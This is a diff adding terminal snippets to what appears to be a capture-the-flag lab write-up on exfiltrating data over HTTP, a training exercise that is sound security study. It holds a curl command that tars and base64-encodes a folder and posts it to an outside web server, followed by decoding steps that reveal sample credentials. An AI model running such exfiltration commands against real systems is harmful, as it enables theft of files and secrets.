@@ -6,6 +6,73 @@
 
 ### 
 
+```Bash
+thm@web-thm:~$ ssh thm@192.168.0.100
+thm@192.168.0.101's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content tha
+t are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Tue Sep  5 23:48:55 2023 from 192.168.0.133
+To run a command as administrator (user "root"), use "sudo <command
+>".
+See "man sudo_root" for details.
+
+thm@web-thm:~$ 
+```
+
+```Bash
+thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http:
+//web.thm.com/contact.php
+```
+
+```Bash
+thm@jump-box:~$ ssh thm@192.168.0.100
+thm@192.168.0.100's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content tha
+t are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Tue Sep  5 21:53:12 2023 from 192.168.0.133
+thm@web-thm:~$ 
+```
+
+```Bash
+thm@web-thm:~$ ls /tmp
+http.bs64
+```
+
+```Bash
+thm@web-thm:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
+task6/
+task6/creds.txt
+```
+
+```Bash
+thm@web-thm:~$ cat task6/creds.txt 
+admin:password
+Admin:123456
+root:toor
+```
+
+```Bash
+thm@web-thm:~$ sudo sed -i 's/ /+/g' /tmp/http.bs64
+
+
 ### HTTP Tunneling
 
 ```Bash
